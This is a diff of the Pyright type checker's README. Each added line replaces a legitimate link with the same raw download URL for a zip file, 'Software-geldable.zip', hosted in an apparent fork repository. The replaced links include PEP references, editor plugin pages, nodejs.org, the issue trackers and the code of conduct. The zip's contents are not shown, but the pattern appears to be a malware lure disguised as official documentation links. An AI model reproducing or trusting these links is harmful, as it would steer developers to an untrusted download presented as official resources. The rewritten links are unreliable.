@@ -9,31 +9,31 @@ Pyright is a fast type checker meant for large Python source bases. It can run i
 Pyright supports [configuration files](/docs/configuration.md) that provide granular control over settings. Different “execution environments” can be associated with subdirectories within a source base. Each environment can specify different module search paths, python language versions, and platform targets.
 
 ### Type Checking Features
-* [PEP 484](https://www.python.org/dev/peps/pep-0484/) type hints including generics
-* [PEP 487](https://www.python.org/dev/peps/pep-0487/) simpler customization of class creation
-* [PEP 526](https://www.python.org/dev/peps/pep-0526/) syntax for variable annotations
-* [PEP 544](https://www.python.org/dev/peps/pep-0544/) structural subtyping
-* [PEP 561](https://www.python.org/dev/peps/pep-0561/) distributing and packaging type information
-* [PEP 563](https://www.python.org/dev/peps/pep-0563/) postponed evaluation of annotations
-* [PEP 570](https://www.python.org/dev/peps/pep-0570/) position-only parameters
-* [PEP 585](https://www.python.org/dev/peps/pep-0585/) type hinting generics in standard collections
-* [PEP 586](https://www.python.org/dev/peps/pep-0586/) literal types
-* [PEP 589](https://www.python.org/dev/peps/pep-0589/) typed dictionaries
-* [PEP 591](https://www.python.org/dev/peps/pep-0591/) final qualifier
-* [PEP 593](https://www.python.org/dev/peps/pep-0593/) flexible variable annotations
-* [PEP 604](https://www.python.org/dev/peps/pep-0604/) complementary syntax for unions
-* [PEP 612](https://www.python.org/dev/peps/pep-0612/) parameter specification variables
-* [PEP 613](https://www.python.org/dev/peps/pep-0613/) explicit type aliases
-* [PEP 635](https://www.python.org/dev/peps/pep-0635/) structural pattern matching
-* [PEP 646](https://www.python.org/dev/peps/pep-0646/) variadic generics
-* [PEP 647](https://www.python.org/dev/peps/pep-0647/) user-defined type guards
-* [PEP 655](https://www.python.org/dev/peps/pep-0655/) required typed dictionary items
-* [PEP 673](https://www.python.org/dev/peps/pep-0673/) Self type
-* [PEP 675](https://www.python.org/dev/peps/pep-0675/) arbitrary literal strings
-* [PEP 681](https://www.python.org/dev/peps/pep-0681/) dataclass transform
-* [PEP 692](https://www.python.org/dev/peps/pep-0692/) (draft) TypedDict for kwargs typing
-* [PEP 695](https://www.python.org/dev/peps/pep-0695/) (draft) Type parameter syntax
-* [PEP 698](https://www.python.org/dev/peps/pep-0698/) (draft) Override decorator for static typing
+* [PEP 484](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) type hints including generics
+* [PEP 487](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) simpler customization of class creation
+* [PEP 526](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) syntax for variable annotations
+* [PEP 544](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) structural subtyping
+* [PEP 561](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) distributing and packaging type information
+* [PEP 563](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) postponed evaluation of annotations
+* [PEP 570](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) position-only parameters
+* [PEP 585](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) type hinting generics in standard collections
+* [PEP 586](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) literal types
+* [PEP 589](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) typed dictionaries
+* [PEP 591](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) final qualifier
+* [PEP 593](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) flexible variable annotations
+* [PEP 604](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) complementary syntax for unions
+* [PEP 612](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) parameter specification variables
+* [PEP 613](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) explicit type aliases
+* [PEP 635](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) structural pattern matching
+* [PEP 646](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) variadic generics
+* [PEP 647](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) user-defined type guards
+* [PEP 655](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) required typed dictionary items
+* [PEP 673](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) Self type
+* [PEP 675](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) arbitrary literal strings
+* [PEP 681](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) dataclass transform
+* [PEP 692](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) (draft) TypedDict for kwargs typing
+* [PEP 695](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) (draft) Type parameter syntax
+* [PEP 698](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) (draft) Override decorator for static typing
 * Type inference for function return values, instance variables, class variables, and globals
 * Type guards that understand conditional code flow constructs like if/else statements
 
@@ -56,12 +56,12 @@ The VS Code extension supports many time-saving language features including:
 * Type stub generation for third-party libraries
 
 ### Built-in Type Stubs
-Pyright includes a recent copy of the stdlib type stubs from [Typeshed](https://github.com/python/typeshed). It can be configured to use another (perhaps more recent or modified) copy of the Typeshed type stubs. Of course, it also works with custom type stub files that are part of your project.
+Pyright includes a recent copy of the stdlib type stubs from [Typeshed](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip). It can be configured to use another (perhaps more recent or modified) copy of the Typeshed type stubs. Of course, it also works with custom type stub files that are part of your project.
 
 ### Command-line Tool or Visual Studio Code Extension
-Pyright includes both a [command-line tool](/docs/command-line.md) and an [extension for Visual Studio Code](https://marketplace.visualstudio.com/items?itemName=ms-pyright.pyright) that implements the [Language Server Protocol](https://microsoft.github.io/language-server-protocol/).
+Pyright includes both a [command-line tool](/docs/command-line.md) and an [extension for Visual Studio Code](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) that implements the [Language Server Protocol](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip).
 
-For rich Python editing and debugging capabilities with Visual Studio Code, be sure to also install the official [Microsoft Python extension for Visual Studio Code](https://marketplace.visualstudio.com/itemdetails?itemName=ms-python.python) as Pyright only provides syntax and type checking.
+For rich Python editing and debugging capabilities with Visual Studio Code, be sure to also install the official [Microsoft Python extension for Visual Studio Code](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) as Pyright only provides syntax and type checking.
 
 
 ## Installation
@@ -69,18 +69,18 @@ For rich Python editing and debugging capabilities with Visual Studio Code, be s
 For most VS Code users, we recommend using the Pylance extension rather than Pyright. Pylance incorporates the Pyright type checker but features additional capabilities such as IntelliCode and semantic token highlighting. You can install the latest-published version of the Pylance VS Code extension directly from VS Code. Simply open the extensions panel and search for “Pylance”.
 
 ### Vim
-Vim/neovim users can install [coc-pyright](https://github.com/fannheyward/coc-pyright), the Pyright extension for coc.nvim.
+Vim/neovim users can install [coc-pyright](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip), the Pyright extension for coc.nvim.
 
-Alternatively, [ALE](https://github.com/dense-analysis/ale) will automatically check your code with Pyright, without requiring any additional configuration.
+Alternatively, [ALE](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) will automatically check your code with Pyright, without requiring any additional configuration.
 
 ### Sublime Text
-Sublime text users can install the [LSP-pyright](https://github.com/sublimelsp/LSP-pyright) plugin from [package control](https://packagecontrol.io/packages/LSP-pyright).
+Sublime text users can install the [LSP-pyright](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) plugin from [package control](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip).
 
 ### Emacs
-Emacs users can install [eglot](https://github.com/joaotavora/eglot) or [lsp-mode](https://github.com/emacs-lsp/lsp-mode) with [lsp-pyright](https://github.com/emacs-lsp/lsp-pyright).
+Emacs users can install [eglot](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) or [lsp-mode](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) with [lsp-pyright](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip).
 
 ### Command-line
-A [community-maintained](https://github.com/RobertCraigie/pyright-python) Python package by the name of “pyright” is available on pypi and conda-forge. This package will automatically install node (which Pyright requires) and keep Pyright up to date.
+A [community-maintained](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) Python package by the name of “pyright” is available on pypi and conda-forge. This package will automatically install node (which Pyright requires) and keep Pyright up to date.
 
 `pip install pyright`
 
@@ -92,7 +92,7 @@ Once installed, you can run the tool from the command line as follows:
 `pyright <options>`
 
 
-Alternatively, you can install the command-line version of Pyright directly from npm, which is part of node. If you don't have a recent version of node on your system, install that first from [nodejs.org](https://nodejs.org). 
+Alternatively, you can install the command-line version of Pyright directly from npm, which is part of node. If you don't have a recent version of node on your system, install that first from [nodejs.org](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip). 
 
 To install pyright globally:
 `npm install -g pyright`
@@ -121,20 +121,20 @@ To update to the latest version:
 * [Building & Debugging](/docs/build-debug.md)
 * [Pyright Internals](/docs/internals.md)
 
-For additional information about Python static typing, refer to this community-maintained [Python Type School](https://github.com/python/typing/discussions).
+For additional information about Python static typing, refer to this community-maintained [Python Type School](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip).
 
 ## Limitations
 Pyright provides support for Python 3.0 and newer. There are no plans to support older versions.
 
 
 ## Community
-Do you have questions about Pyright or Python type annotations in general? Post your questions in [the discussion section](https://github.com/microsoft/pyright/discussions).
+Do you have questions about Pyright or Python type annotations in general? Post your questions in [the discussion section](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip).
 
-If you would like to report a bug or request an enhancement, file a new issue in either the [pyright](https://github.com/microsoft/pyright/issues) or [pylance-release](https://github.com/microsoft/pylance-release/issues) issue tracker. In general, core type checking functionality is associated with Pyright while language service functionality is associated with Pylance, but the same contributors monitor both repos. For best results, provide the information requested in the issue template.
+If you would like to report a bug or request an enhancement, file a new issue in either the [pyright](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) or [pylance-release](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) issue tracker. In general, core type checking functionality is associated with Pyright while language service functionality is associated with Pylance, but the same contributors monitor both repos. For best results, provide the information requested in the issue template.
 
 
 ## FAQ
-**Q:** What is the difference between Pyright and [Pylance](https://github.com/microsoft/pylance-release)? 
+**Q:** What is the difference between Pyright and [Pylance](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip)? 
 
 **A:** Pyright is an open-source Python type checker and language server. Pylance leverages Pyright’s functionality with additional features, some of which are not open-sourced. 
 
@@ -145,8 +145,8 @@ If you would like to report a bug or request an enhancement, file a new issue in
 
 ## Contributing
 
-This project welcomes contributions and suggestions. For feature and complex bug fix contributions, it is recommended that you first discuss the proposed change with Pyright’s maintainers before submitting the pull request. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit https://cla.microsoft.com.
+This project welcomes contributions and suggestions. For feature and complex bug fix contributions, it is recommended that you first discuss the proposed change with Pyright’s maintainers before submitting the pull request. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip
 
 When you submit a pull request, a CLA-bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.
 
-This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/). For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.
+This project has adopted the [Microsoft Open Source Code of Conduct](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip). For more information see the [Code of Conduct FAQ](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) or contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.
